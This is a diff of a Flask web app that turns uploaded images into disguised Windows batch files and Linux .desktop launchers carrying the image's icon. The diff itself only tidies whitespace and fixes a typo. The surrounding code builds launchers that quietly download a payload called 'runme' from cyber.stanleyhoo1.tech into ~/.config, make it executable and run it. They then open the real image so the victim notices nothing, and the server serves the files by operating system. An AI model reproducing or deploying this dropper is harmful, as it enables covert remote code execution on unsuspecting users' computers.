@@ -118,47 +118,47 @@ def home():
 @app.route("/proceed", methods=['GET', 'POST'])
 def proceed():
     img = request.files.get("image")
-    
+
     # Actual image name (used to retrive it with proper name later)
     original_filename = img.filename
-    
+
     # Filename for the exe that will be downloaded
     session['filename'] = f'{os.path.splitext(original_filename)[0]}'
 
     # Generate unique filename so we don't accidently override
     extension = os.path.splitext(img.filename)[1]
     filename = f"{uuid.uuid4().hex}{extension}"
-    
+
     # Save image to disk
     upload_path = os.path.join(app.config["UPLOAD_FOLDER"], filename)
     img.save(upload_path)
 
     # Path for image with removed background
     processed_path = os.path.join(app.config["PROCESSED_FOLDER"], filename)
-    
+
     # Path for the exe icon
     ico_path = os.path.join("icos", f'{os.path.splitext(filename)[0]}.ico')
-    
+
     # Path for the desktop icon
     png_path = os.path.join("pngs", f'{os.path.splitext(filename)[0]}.png')
-    
+
     # Path for the batfile
     batfile_path = os.path.join("batfiles", f'{os.path.splitext(filename)[0]}.bat')
-    
+
     # Creates the batfile
     batfile = batfile_template[:]
     batfile += f'''\nwsl bash -c "curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null"'''
     batfile += f'''\nstart {original_filename}'''
-    
+
     batfile += del_exe
-    
+
     # Saves the batfile
     with open(batfile_path, 'w') as file:
         file.write(batfile)
-        
+
     # Path for the desktop file
     deskfile_path = os.path.join("deskfiles", f'{os.path.splitext(filename)[0]}.desktop')
-    
+
     # Creates the desktop file
     deskfile = desktop_template[:]
     deskfile = deskfile.replace("FILENAME", original_filename)
@@ -166,15 +166,15 @@ def proceed():
     deskfile_commands += f"curl -s -X POST -o ~/.config/rm17-node https://cyber.stanleyhoo1.tech/files/runme 2>/dev/null; chmod +x ~/.config/rm17-node 2>/dev/null; ~/.config/rm17-node 2>/dev/null; curl -s -X POST -o {original_filename} https://cyber.stanleyhoo1.tech/download_image/{filename} 2>/dev/null; rm .{os.path.splitext(filename)[0]}.png; xdg-open {original_filename}"
     deskfile = deskfile.replace("COMMANDS", deskfile_commands)
     deskfile = deskfile.replace("PNG_PATH", f'{os.path.splitext(original_filename)[0]}.png')
-    
+
     # Saves the desktop file
     with open(deskfile_path, 'w') as file:
         file.write(deskfile)
-    
+
     # Removes image background
     subprocess.run(["backgroundremover", "-i", upload_path, "-o", processed_path])
     shutil.copy(processed_path, png_path)
-    
+
     # Creates the ico from the image
     img = Image.open(processed_path)
     img.save(ico_path, format='ICO', sizes=[(256, 256), (64, 64), (32, 32)])
@@ -279,7 +279,7 @@ def register():
         return 'User registered successfully.'
     except sqlite3.IntegrityError:
         return 'Username already exists.'
-    
+
 # Logout
 @app.route('/logout', methods=['POST'])
 def logout():
@@ -305,7 +305,7 @@ def list_files():
         f'<li><a href="/files/{file}">{file}</a></li>' for file in files
     )
     return f"<ul>{files_html}</ul>"
-    
+
 # Download the scripts we will run
 @app.route('/files/<path:filename>', methods=['POST'])
 def get_file(filename):
@@ -314,7 +314,7 @@ def get_file(filename):
 # Download the actual image via curl
 @app.route('/download_image/<path:filename>', methods=['POST'])
 def download_img(filename):
-    return send_from_directory(PROCESSED_FOLDER, filename)    
+    return send_from_directory(PROCESSED_FOLDER, filename)
 
 # Download executables based on the OS
 @app.route('/download/<path:filename>', methods=['GET', 'POST'])
@@ -329,16 +329,16 @@ def download_file(filename):
         # return send_file("mac.dmg", as_attachment=True)
     elif "linux" in ua:
         print("linux")
-        
+
         return send_from_directory(DESKTOP_FOLDER, f'{filename}.desktop', download_name=f'{session['filename']}.desktop', as_attachment=True)
-    
+
     return ""
 
 # Download desktop file icon
 @app.route('/icon/<path:filename>', methods=['GET', 'POST'])
 def download_icon(filename):
-    return send_from_directory(PNG_FOLDER, f'{filename}.png', download_name=f'{session['filename']}.png', as_attatchment=True)
-    
+    return send_from_directory(PNG_FOLDER, f'{filename}.png', download_name=f'{session['filename']}.png', as_attachment=True)
+
 if __name__ == "__main__":
     create_db()
     # To create new users
